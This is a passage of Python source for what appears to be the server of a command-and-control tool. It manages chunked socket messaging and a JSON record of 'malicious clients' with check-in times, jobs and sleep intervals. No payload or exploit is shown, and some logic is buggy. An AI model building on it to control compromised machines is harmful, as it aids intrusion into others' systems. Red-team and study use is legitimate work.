                logging.debug(f"[Server (send_msg_to_friendlyclient: {self.id})] SENDING CHUNK {i+1}/{chunks}")
                conn.send(str_encode(chunk))
            except Exception as e:
                logging.debug(f"[Server (send_msg_to_maliciousclient: {self.id})] error sending: {e}")
        
        #recv_msg = self.recieve_msg_from_maliciousclient()
        #return recv_msg

    def recieve_msg_from_maliciousclient(self) -> str:
        conn = self.conn
        complete_msg = ""
        ## clients need to have a shared known header beforehand. Default is 10
        HEADER_BYTES = 10
        BUFFER = 1024
        header_value = 0
        header_contents = ""
        
        msg_bytes_recieved_so_far = 0
        
        logging.debug(f"[Server (recieve_msg_from_maliciousclient: {self.id})] WAITING ON HEADER TO BE SENT:")
        header_msg_length = conn.recv(HEADER_BYTES).decode() #int(bytes_decode(msg)
        logging.debug(f"[Server (recieve_msg_from_maliciousclient: {self.id})] HEADER: {header_msg_length}")
        
        ## getting the amount of chunks/iterations eneded at 1024 bytes a message
        chunks = math.ceil(int(header_msg_length)/BUFFER)
        
        complete_msg = "" #bytes_decode(msg)[10:]
        
        #while True:
        for i in range(0, chunks):
            logging.debug(f"[Server (recieve_msg_from_maliciousclient: {self.id})] WAITING TO RECEIEVE CHUNK {i + 1}/{chunks}:")
            msg = conn.recv(BUFFER)  # << adjustble, how many bytes you want to get per iteration
            
            ## getting the amount of bytes sent so far
            msg_bytes_recieved_so_far = msg_bytes_recieved_so_far + len(bytes_decode(msg))

            complete_msg += bytes_decode(msg)

            '''print(f"""DEBUG:
                Full Message Length (based on header value) {header_msg_length}
                Header size: {HEADER_BYTES}

                Size of message recieved so far: {msg_bytes_recieved_so_far}  
                
                Chunks: {chunks}          
                
                """)'''
            
            ## if complete_msg is the same length as what the headers says, consider it complete. 
            if len(complete_msg) == header_msg_length:
                logging.debug(f"[Server (recieve_msg_from_maliciousclient: {self.id})] MSG TRANSFER COMPLETE")

        return complete_msg
            

################
## QOL Functions
################

"""
Desc: A custom encode/decoder for things, with a format try/except block built in.
Some clients send odd characters sometimes so this is a failsafe
"""

## str -> bytes
def str_encode(input, formats=["utf-8", "iso-8859-1", "windows-1252", "ascii"]) -> bytes:
    for format in formats:
        try:
            return input.encode(format)
        except UnicodeEncodeError:
            logging.debug(f"Could not encode bytes to {format}")
        except Exception as e:
            logging.warning(f"ERRMSG: {e}\n")


## bytes -> str
def bytes_decode(input, formats=["utf-8", "iso-8859-1", "windows-1252", "ascii"]) -> str:
    for format in formats:
        try:
            return input.decode(format)
            logging.debug(f"Succesfully decoded bytes to {format}")
        except UnicodeEncodeError:
            logging.debug(f"Could not decode bytes to {format}")
        except Exception as e:
            logging.warning(f"ERRMSG: {e}\n")


################
## JSON & Data
################
class Data:
    """
    A handler for JSON data. This is a static class

    Current idea: Send data into it, and this function will handle the correct updating, writing, reading etc of the file.

    The raw JSON exists here so this whole thing can be one file
    """
    
    ##placeholder needed so the loop iterates over something, otherwise it does nothing
    ## see json_new_client
    default_json = {
        "ServerName": "Server-Name",
        "ServerIp": "127.0.0.1",
        "MaliciousClients": [
            {
                "ClientFullName":"Placeholder",
                "ClientIP": "127.0.0.1",
                "ClientPort": "6969",
                "ClientId": "DEFAULT",
                "CurrentJob": "Wait",
                "SleepTime": 60,
                "LatestCheckin": "01:23:45 UTC 01/01",
                "FirstCheckin": "01:23:45 UTC 01/01",
                "Active": "No"
            }
        ],
        "FriendlyClients": [
        ]
    }
    default_malicious_client = {
        "ClientFullName": "client_127.0.0.1_DEFAULT",
        "ClientIP": "127.0.0.1",
        "ClientPort": "6969",
        "ClientId": "DEFAULT",
        "CurrentJob": "Wait",
        "SleepTime": 60,
        "LatestCheckin": "01:23:45 UTC 01/01",
        "FirstCheckin": "01:23:45 UTC 01/01",
        "Active": "No"
    }
    default_friendly_client = {
        "ClientUserName": "Bob",
        "ClientIP": "127.0.0.1",
        "ClientPort": "6969",
        "LatestLogin": "01:23:45 UTC 01/01",
        "FirstLogin": "01:23:45 UTC 01/01"
    }
    
    @staticmethod
    def json_create():
        """creates the default JSON file
        """
        ## needs to check if file exists
        with open("server_json.json", "w+") as json_file:
            json.dump(Data.default_json, json_file)
        
        #pass
    @staticmethod
    def json_new_client(client_data_raw):
        #print(type(client_data_raw))
        """ Creates a new client section/appendage to the json data, that json object is created in handle_client,
        and is passed here. the defualt_malicious_client is for reference
        
        The loop checks if an entry already exists (via the ClientFullName), and if so, returns. Only if an entry does not exist does it create one
        """
        client_data = json.loads(client_data_raw)

        #print(type(client_data))
        #print(client_data)
        
        #writing to json file
        with open("server_json.json", "r+") as json_file:
            data = json.load(json_file)
            #print(type(data))
            ## if client already logged
            #for client in data['MaliciousClients']:
            for client in data['MaliciousClients']:
                if client['ClientFullName'] == client_data['ClientFullName']:
                    #print(f"A client with the name {client_data['ClientFullName']} already exists")
                    return
                
                data["MaliciousClients"].append(client_data)
                json_file.seek(0)  # move file pointer to the beginning of the file
                json.dump(data, json_file)
                logging.debug(f"[Server ({client_data['ClientFullName']})] JSON Record: New Record Created")

    @staticmethod
    def json_update(keyname=None, value=None, parent_key=None, client_name=None):
        """_summary_

        Args:
            keyname (string, optional): The key to edit, Defaults to None.
            value (str/int, optional): the value for the key that is being editoed. Defaults to None
            parent_key (str, optional): the parent key for the item in question (for now, MaliciousClients or FriendlyClients ). Defaults to None.
        """
        
        #pass
        with open("server_json.json", "r+") as json_file:
            data = json.load(json_file)
        
        for client in data[parent_key]:
            if client['ClientFullName'] == client_name:
                logging.debug(f"[Server ({client_name})] JSON Record: Changing {keyname} to {value} from {client[keyname]}")
                ## setting respective key to value
                #print(client[keyname])
                client[keyname] = value
                break
        ## old way
        #data[parent_key][0][keyname] = value
        ## write file after modification
        with open("server_json.json", "w") as json_file:
            json.dump(data, json_file)


#if __name__ == "__main__":
if fileserverport == port:
    logging.critical(f"[SERVER] Fileserver ({fileserverport}) & Listenserver ({port}) port are the same. They need to be different ")

#fs_thread = threading.Thread(target=httpserver.fileserver_start, kwargs={'ip': "0.0.0.0",'port': fileserverport})
#fs_thread.start()

Data.json_create()
s = ServerSockHandler()
s.start_server(ip, port)